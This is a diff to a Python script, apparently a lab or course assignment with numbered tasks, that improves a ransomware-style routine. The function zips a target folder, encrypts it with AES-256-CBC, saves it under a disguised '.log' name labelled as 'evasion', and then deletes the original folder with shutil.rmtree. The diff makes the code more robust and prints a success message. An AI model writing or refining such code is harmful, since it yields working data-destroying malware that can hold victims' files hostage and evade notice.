@@ -15,8 +15,15 @@ def pad(data):
 def encrypt_folder(folder_path, password):
     """Encrypt folder to 'malware_encrypted.log' (Task 3)."""
     try:
+        # Normalize and verify path
+        folder_path = os.path.abspath(os.path.normpath(folder_path.strip('"\'')))
+        if not os.path.exists(folder_path):
+            print(f"[!] Error: Folder not found - {folder_path}")
+            return False
+
         # Create ZIP (evasion: hides file structure)
-        shutil.make_archive('temp_archive', 'zip', folder_path)
+        zip_path = os.path.join(os.path.dirname(folder_path), 'temp_archive.zip')
+        shutil.make_archive(zip_path[:-4], 'zip', folder_path)
         
         # Generate IV + key (Task 3: AES-256-CBC)
         iv = os.urandom(BLOCK_SIZE)
@@ -33,16 +40,18 @@ def encrypt_folder(folder_path, password):
         # Encrypt
         cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend())
         encryptor = cipher.encryptor()
-        with open('temp_archive.zip', 'rb') as f:
+        with open(zip_path, 'rb') as f:
             ciphertext = iv + salt + encryptor.update(pad(f.read())) + encryptor.finalize()
         
         # Save as .log (Task 5: evasion)
-        with open('malware_encrypted.log', 'wb') as f:
+        output_path = os.path.join(os.path.dirname(folder_path), 'malware_encrypted.log')
+        with open(output_path, 'wb') as f:
             f.write(ciphertext)
         
         # Cleanup
-        os.remove('temp_archive.zip')
+        os.remove(zip_path)
         shutil.rmtree(folder_path)
+        print(f"[+] Encryption successful! File saved to: {output_path}")
         return True
     except Exception as e:
         print(f"[!] Encryption failed: {e}")
